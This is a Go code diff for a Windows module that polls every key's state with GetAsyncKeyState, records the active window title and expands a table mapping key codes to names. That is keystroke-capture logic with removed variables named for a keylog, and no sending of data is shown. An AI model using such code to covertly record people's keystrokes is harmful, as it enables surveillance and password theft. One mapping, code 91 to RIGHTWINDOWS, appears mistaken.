@@ -13,9 +13,6 @@ var (
 	procGetAsyncKeyState    = user32.NewProc("GetAsyncKeyState")
 	procGetForegroundWindow = user32.NewProc("GetForegroundWindow") //GetForegroundWindow
 	procGetWindowTextW      = user32.NewProc("GetWindowTextW")      //GetWindowTextW
-
-	tmpKeylog string
-	tmpTitle  string
 )
 
 func getForegroundWindow() (hwnd syscall.Handle, err error) {
@@ -46,7 +43,7 @@ func GetActiveWindowTitle() string {
 	b := make([]uint16, 200)
 	_, err := getWindowText(g, &b[0], int32(len(b)))
 	if err != nil {
-		ConsoleWriteError(fmt.Sprintf("error: %s", err))
+		PublishError(fmt.Sprintf("get active window error: %s", err))
 		return fmt.Sprintf("error: %s", err)
 	}
 	return syscall.UTF16ToString(b)
@@ -170,6 +167,9 @@ const (
 	ARROWLEFT         KeyCode = "ARROWLEFT"
 	ARROWRIGHT        KeyCode = "ARROWRIGHT"
 	COMMA             KeyCode = "COMMA"
+	EQUALS            KeyCode = "EQUALS"
+	HOME              KeyCode = "HOME"
+	WINDOWS           KeyCode = "WIN"
 	UNKNOWN           KeyCode = "UNKNOWN"
 )
 
@@ -279,6 +279,8 @@ func toKeycode(key int) KeyCode {
 		return RBUTTON
 	case 0x04:
 		return MBUTTON
+	case 8:
+		return BACK
 	case 9:
 		return TAB
 	case 13:
@@ -291,6 +293,16 @@ func toKeycode(key int) KeyCode {
 		return ALT
 	case 27:
 		return ESC
+	case 32:
+		return SPACE
+	case 33:
+		return PAGEUP
+	case 34:
+		return PAGEDOWN
+	case 35:
+		return END
+	case 36:
+		return HOME
 	case 38:
 		return ARROWUP
 	case 37:
@@ -299,38 +311,76 @@ func toKeycode(key int) KeyCode {
 		return ARROWRIGHT
 	case 40:
 		return ARROWDOWN
+	case 46:
+		return DELETE
+	case 91:
+		return RIGHTWINDOWS
+	case 92:
+		return RIGHTWINDOWS
+	case 112:
+		return F1
+	case 113:
+		return F2
+	case 114:
+		return F3
+	case 115:
+		return F4
+	case 116:
+		return F5
+	case 117:
+		return F6
+	case 118:
+		return F7
+	case 119:
+		return F8
+	case 120:
+		return F9
+	case 121:
+		return F10
+	case 122:
+		return F11
+	case 123:
+		return F12
 	case 160:
 		return LSHIFT
+	case 187:
+		return EQUALS
 	case 188:
 		return COMMA
+	case 189:
+		return SUBTRACT
 	}
+	PublishError(fmt.Sprintf("unknown key: %d", key))
+	return KeyCode(fmt.Sprintf("?(%d)", key))
+}
 
-	ConsoleWriteError(fmt.Sprintf("unknown key: %d", key))
-	return UNKNOWN
+func toKeycodes(key int) []KeyCode {
+	keycodes := []KeyCode{}
+	keycode := toKeycode(key)
+
+	keycodes = append(keycodes, keycode)
+
+	if keycode == LEFTWINDOWS || keycode == RIGHTWINDOWS {
+		keycodes = append(keycodes, WINDOWS)
+	}
+	return keycodes
 }
 
 func GetPressedKeys() []KeyCode {
 	var keys []KeyCode
-	for KEY := 0; KEY <= 256; KEY++ {
-		Val, _, _ := procGetAsyncKeyState.Call(uintptr(KEY))
-		if Val == 0 {
+	for i := 0; i <= 256; i++ {
+		event, _, _ := procGetAsyncKeyState.Call(uintptr(i))
+		if event == 0 {
 			continue
 		}
-		key := toKeycode(KEY)
-		if key == UNKNOWN {
-			continue
-		}
-		if key == LeftMENU {
-			continue
-		}
-		if Val == 32769 {
-			keys = append(keys, key)
-		} else if Val == 32768 {
-			keys = append(keys, key)
-		} else if Val == 1 {
-			keys = append(keys, key)
-		} else if Val != 0 {
-      ConsoleWriteError(fmt.Sprintf("unknown value: %d key: %d", Val, toKeycode(KEY))) 
+		if event == 32769 {
+			keys = append(keys, toKeycodes(i)...)
+		} else if event == 32768 {
+			keys = append(keys, toKeycodes(i)...)
+		} else if event == 1 {
+			keys = append(keys, toKeycodes(i)...)
+		} else if event != 0 {
+			PublishError(fmt.Sprintf("unknown Val %d for key %s", event, toKeycodes(i)))
 		}
 	}
 	return keys
